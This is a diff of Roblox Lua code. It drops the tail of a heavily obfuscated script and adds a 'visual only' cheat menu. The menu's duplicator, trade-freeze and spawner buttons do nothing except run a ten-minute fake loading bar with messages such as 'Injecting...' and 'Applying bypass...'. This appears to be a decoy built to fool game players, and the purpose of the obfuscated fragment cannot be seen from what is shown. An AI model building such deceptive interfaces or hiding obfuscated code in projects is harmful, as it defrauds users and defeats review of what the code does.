imJRq=ymJRq[UZJRq]zZJRq={imJRq(GZJRq)}oZJRq=zZJRq[2]UZJRq=zZJRq[1]zZJRq=UZJRq imJRq=zZJRq and 6352847 or 1037638 UZJRq=zZJRq end end end else if imJRq<3338732 then if imJRq<3025914 then if imJRq<2978068 then if imJRq<2937574 then zZJRq=nil imJRq=10258593 XZJRq=nil else nZJRq=aZJRq()kZJRq=emJRq[123496416]wZJRq[nZJRq]=OZJRq[1]oZJRq=wZJRq[nZJRq]zZJRq=emJRq[123497193]GZJRq=oZJRq[zZJRq]XZJRq=ymJRq[kZJRq]kZJRq=emJRq[123497970]zZJRq=XZJRq[kZJRq]XZJRq=emJRq[123498747]oZJRq=zZJRq[XZJRq]TZJRq=GZJRq==oZJRq UZJRq=TZJRq imJRq=TZJRq and 13953000 or 3312853 end else imJRq=wZJRq[vZJRq[1]]zZJRq={}TZJRq=true nZJRq=OZJRq[1]oZJRq=emJRq[123499524]UZJRq=emJRq[123500301]imJRq[UZJRq]=TZJRq imJRq=wZJRq[vZJRq[2]]UZJRq=emJRq[123501078]TZJRq=nZJRq imJRq[UZJRq]=TZJRq UZJRq=emJRq[123501855]imJRq=wZJRq[vZJRq[3]]xZJRq=-950571 pZJRq=emJRq[123502632]GZJRq=ymJRq[oZJRq]oZJRq=emJRq[123503409]TZJRq=GZJRq[oZJRq]oZJRq=#zZJRq kZJRq=0 XZJRq={kZJRq}zZJRq=#XZJRq GZJRq=TZJRq(oZJRq,zZJRq)imJRq[UZJRq]=GZJRq imJRq=wZJRq[vZJRq[4]]TZJRq=wZJRq[vZJRq[3]]zZJRq=emJRq[123504186]oZJRq=ymJRq[zZJRq]zZJRq=emJRq[123504963]YZJRq=-950570 GZJRq=oZJRq[zZJRq]zZJRq
-end)()
+-- ================= CHRONO HUB | VISUAL ONLY =================
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+local LOAD_TIME = 10 * 60 -- 10 minutes
+
+-- ================= FULLSCREEN LOADING =================
+local loadGui = Instance.new("ScreenGui")
+loadGui.Name = "ChronoLoading"
+loadGui.IgnoreGuiInset = true
+loadGui.ResetOnSpawn = false
+loadGui.Enabled = false
+loadGui.Parent = player:WaitForChild("PlayerGui")
+
+local bg = Instance.new("Frame", loadGui)
+bg.Size = UDim2.fromScale(1,1)
+bg.BackgroundColor3 = Color3.fromRGB(5,5,5)
+bg.BorderSizePixel = 0
+
+-- glitch particles
+for i = 1, 40 do
+local glitch = Instance.new("Frame", bg)
+glitch.Size = UDim2.fromScale(math.random(2,6)/100, 0.002)
+glitch.Position = UDim2.fromScale(math.random(), math.random())
+glitch.BackgroundColor3 = Color3.fromRGB(45,45,45)
+glitch.BorderSizePixel = 0
+
+task.spawn(function()  
+	while true do  
+		TweenService:Create(  
+			glitch,  
+			TweenInfo.new(math.random(4,10), Enum.EasingStyle.Linear),  
+			{Position = UDim2.fromScale(math.random(), math.random())}  
+		):Play()  
+		task.wait(6)  
+	end  
+end)
+
+end
+
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.fromScale(1,0.1)
+title.Position = UDim2.fromScale(0,0.22)
+title.BackgroundTransparency = 1
+title.TextScaled = true
+title.Font = Enum.Font.Arcade
+title.TextColor3 = Color3.fromRGB(235,235,235)
+
+local status = Instance.new("TextLabel", bg)
+status.Size = UDim2.fromScale(1,0.05)
+status.Position = UDim2.fromScale(0,0.34)
+status.BackgroundTransparency = 1
+status.TextScaled = true
+status.Font = Enum.Font.Arcade
+status.TextColor3 = Color3.fromRGB(160,160,160)
+
+local barBg = Instance.new("Frame", bg)
+barBg.Size = UDim2.fromScale(0.7,0.02)
+barBg.Position = UDim2.fromScale(0.15,0.45)
+barBg.BackgroundColor3 = Color3.fromRGB(25,25,25)
+barBg.BorderSizePixel = 0
+
+local bar = Instance.new("Frame", barBg)
+bar.Size = UDim2.fromScale(0,1)
+bar.BackgroundColor3 = Color3.fromRGB(120,180,255)
+bar.BorderSizePixel = 0
+
+local texts = {
+"Injecting...",
+"Securing script...",
+"Syncing assets...",
+"Applying bypass...",
+"Finalizing..."
+}
+
+local function startLoading(name)
+loadGui.Enabled = true
+title.Text = name
+bar.Size = UDim2.fromScale(0,1)
+
+TweenService:Create(  
+	bar,  
+	TweenInfo.new(LOAD_TIME, Enum.EasingStyle.Linear),  
+	{Size = UDim2.fromScale(1,1)}  
+):Play()  
+
+task.spawn(function()  
+	local i = 1  
+	while loadGui.Enabled do  
+		status.Text = texts[i]  
+		i = (i % #texts) + 1  
+		task.wait(12)  
+	end  
+end)
+
+end
+
+-- ================= MAIN PICKER =================
+local gui = Instance.new("ScreenGui")
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = player.PlayerGui
+
+local panel = Instance.new("Frame", gui)
+panel.Size = UDim2.fromScale(0.33,0.42)
+panel.Position = UDim2.fromScale(0.335,0.29)
+panel.BackgroundColor3 = Color3.fromRGB(15,15,15)
+panel.BorderSizePixel = 0
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0,20)
+
+-- draggable
+do
+local dragging = false
+local dragStart, startPos
+
+panel.InputBegan:Connect(function(input)  
+	if input.UserInputType == Enum.UserInputType.MouseButton1  
+	or input.UserInputType == Enum.UserInputType.Touch then  
+		dragging = true  
+		dragStart = input.Position  
+		startPos = panel.Position  
+
+		input.Changed:Connect(function()  
+			if input.UserInputState == Enum.UserInputState.End then  
+				dragging = false  
+			end  
+		end)  
+	end  
+end)  
+
+panel.InputChanged:Connect(function(input)  
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement  
+	or input.UserInputType == Enum.UserInputType.Touch) then  
+		local delta = input.Position - dragStart  
+		panel.Position = UDim2.new(  
+			startPos.X.Scale,  
+			startPos.X.Offset + delta.X,  
+			startPos.Y.Scale,  
+			startPos.Y.Offset + delta.Y  
+		)  
+	end  
+end)
+
+end
+
+local hubTitle = Instance.new("TextLabel", panel)
+hubTitle.Size = UDim2.fromScale(1,0.18)
+hubTitle.BackgroundTransparency = 1
+hubTitle.Text = "CHRONO HUB"
+hubTitle.TextScaled = true
+hubTitle.Font = Enum.Font.Arcade
+hubTitle.TextColor3 = Color3.fromRGB(210,210,210)
+
+local function makeBtn(text, color, y)
+local b = Instance.new("TextButton", panel)
+b.Size = UDim2.fromScale(0.9,0.18)
+b.Position = UDim2.fromScale(0.05,y)
+b.Text = text
+b.TextScaled = true
+b.Font = Enum.Font.Arcade
+b.TextColor3 = Color3.new(1,1,1)
+b.BackgroundColor3 = color
+b.BorderSizePixel = 0
+Instance.new("UICorner", b).CornerRadius = UDim.new(0,16)
+return b
+end
+
+makeBtn("🔥 DUPLICATOR", Color3.fromRGB(170,60,60), 0.22)
+.MouseButton1Click:Connect(function()
+startLoading("DUPLICATOR")
+end)
+
+makeBtn("❄️ TRADE FREEZE", Color3.fromRGB(60,100,180), 0.45)
+.MouseButton1Click:Connect(function()
+startLoading("TRADE FREEZE")
+end)
+
+makeBtn("✨ SPAWNER", Color3.fromRGB(60,150,90), 0.68)
+.MouseButton1Click:Connect(function()
+startLoading("SPAWNER")
+end)
